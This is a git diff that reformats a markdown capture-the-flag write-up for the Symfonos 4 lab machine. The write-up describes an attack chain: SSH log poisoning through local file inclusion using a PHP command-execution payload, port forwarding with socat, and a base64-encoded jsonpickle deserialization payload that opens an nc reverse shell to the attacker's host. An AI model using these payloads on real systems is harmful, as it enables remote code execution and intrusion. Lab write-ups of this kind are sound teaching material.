@@ -82,15 +82,22 @@ Downloaded all log files to my machine.[br/](br/)
 
 ``hades.log``
 
->Hades was the god of the underworld and the name eventually came to also describe the home of the dead as well. He was the oldest male child of Cronus and Rhea. Hades and his brothers Zeus and Poseidon defeated their father and the Titans to end their reign, claiming rulership over the cosmos.
+```
+Hades was the god of the underworld and the name eventually came to also describe the home of the dead as well. He was the oldest male child of Cronus and Rhea. Hades and his brothers Zeus and Poseidon defeated their father and the Titans to end their reign, claiming rulership over the cosmos.
+```
 
 ``poseidon.log``
 
->Poseidon was the god of the sea, earthquakes and horses. Although he was officially one of the supreme gods of Mount Olympus, he spent most of his time in his watery domain. Poseidon was brother to Zeus and Hades. These three gods divided up creation.
+```
+Poseidon was the god of the sea, earthquakes and horses. Although he was officially one of the supreme gods of Mount Olympus, he spent most of his time in his watery domain. Poseidon was brother to Zeus and Hades. These three gods divided up creation.
+```
+
 
 ``zeus.log``
 
->Zeus is the god of the sky, lightning and thunder in Ancient Greek religion and myth, and king of the gods on Mount Olympus. Zeus is the sixth child of Kronos and Rhea, king and queen of the Titans.
+```
+Zeus is the god of the sky, lightning and thunder in Ancient Greek religion and myth, and king of the gods on Mount Olympus. Zeus is the sixth child of Kronos and Rhea, king and queen of the Titans.
+```
 
 ``/atlantis.php``
 
@@ -119,8 +126,7 @@ But I can't view ``/etc/passwd`` so I searched for any log files and I got ``/va
 
 When seeing those Log files it shows ``OpenSSH`` so we can do ``SSH Log Poisoning``
 
-Reference :
->https://www.hackingarticles.in/rce-with-lfi-and-ssh-log-poisoning/
+Reference : https://www.hackingarticles.in/rce-with-lfi-and-ssh-log-poisoning/
 
 ```ssh '[?php system($_GET['c']); ?](?php system($_GET['c']); ?)'@192.168.1.136```
 
@@ -151,15 +157,16 @@ Uploaded My Enumeration Script and Found this
 
 ![](https://raw.githubusercontent.com/ghostbyt3/ghostbyt3.github.io/master/public/static/images/symfonos4/14.png)
 
-> - Port 3306 - MySQL
-> - Port 8080 - Webpage (Maybe)
+- Port 3306 - MySQL
+- Port 8080 - Webpage (Maybe)
 
 We can’t see port ``8080`` directly so We need to do [Port Forward](https://en.wikipedia.org/wiki/Port_forwarding) by doing this we can access the webpage from our machine.
 
-I used ``socat`` method for port forwarding. We can also use ``SSH`` interactive shell for port forwarding too.
->https://www.cyberciti.biz/faq/linux-unix-tcp-port-forwarding/
+I used ``socat`` method for port forwarding. We can also use ``SSH`` interactive shell for port forwarding too. (https://www.cyberciti.biz/faq/linux-unix-tcp-port-forwarding/)
 
->socat TCP-LISTEN:8081,fork TCP:127.0.0.1:8080
+```
+socat TCP-LISTEN:8081,fork TCP:127.0.0.1:8080
+```
 
 ![](https://raw.githubusercontent.com/ghostbyt3/ghostbyt3.github.io/master/public/static/images/symfonos4/15.png)
 
@@ -185,7 +192,9 @@ Later I found this [article](https://versprite.com/blog/application-security/int
 
 So I did some changes in the string and encoded this to base64.
 
-> {"py/object": "__main__.Shell", "py/reduce": [{"py/type": "os.system"}, {"py/tuple": ["/usr/bin/nc -e /bin/bash 192.168.1.103 1234"]}, null, null, null]}
+```
+{"py/object": "__main__.Shell", "py/reduce": [{"py/type": "os.system"}, {"py/tuple": ["/usr/bin/nc -e /bin/bash 192.168.1.103 1234"]}, null, null, null]}
+```
 
 Gave that base64 encoded to ``username`` and started my Listener and got shell.
 
